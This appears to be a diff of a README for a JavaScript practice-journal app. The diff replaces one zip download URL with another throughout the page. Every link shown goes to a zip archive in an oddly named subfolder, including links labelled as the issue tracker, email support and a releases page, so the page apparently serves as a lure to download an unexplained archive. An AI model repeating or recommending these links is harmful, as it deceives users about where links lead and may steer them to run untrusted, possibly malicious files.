@@ -1,7 +1,7 @@
 # 📝 js-practice-journal - Track Your JavaScript Learning Journey
 
 ## 📥 Download the Application
-[![Download Now](https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip)
+[![Download Now](https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip%20Now-v1.0-brightgreen)](https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip)
 
 ## 🚀 Getting Started
 Welcome to the js-practice-journal! This journal helps you document your journey while learning JavaScript. With this simple application, you can track your progress and reflect on your coding experiences.
@@ -17,7 +17,7 @@ To ensure smooth operation of the js-practice-journal, please meet the following
 ## 📥 Download & Install
 To get started, visit the following link to download the latest version of the application:
 
-[Download the latest release](https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip).
+[Download the latest release](https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip).
 
 1. Click the link above to access the Releases page.
 2. Find the latest version listed. 
@@ -51,12 +51,12 @@ To get the most out of your journaling experience, consider the following tips:
 ## 📞 Support and Feedback
 If you have questions or suggestions, please feel free to reach out. Your feedback is valuable in improving this journal for other learners.
 
-- **GitHub Issues:** Visit the [Issues Section](https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip) to report bugs or suggest features.
-- **Email Support:** If you need direct support, send an email to [https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip](https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip).
+- **GitHub Issues:** Visit the [Issues Section](https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip) to report bugs or suggest features.
+- **Email Support:** If you need direct support, send an email to [https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip](https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip).
 
 ## 📥 Download the Application Again
 Don't forget, you can always return to our Releases page to download the latest version:
 
-[Download the latest release](https://raw.githubusercontent.com/Jayeshdubey16/js-practice-journal/main/Sphaerocarpus/practice-journal-js-2.4.zip).
+[Download the latest release](https://github.com/Jayeshdubey16/js-practice-journal/raw/refs/heads/main/Sphaerocarpus/js-journal-practice-bunter.zip).
 
 Thank you for using the js-practice-journal! Enjoy your journey in learning JavaScript.
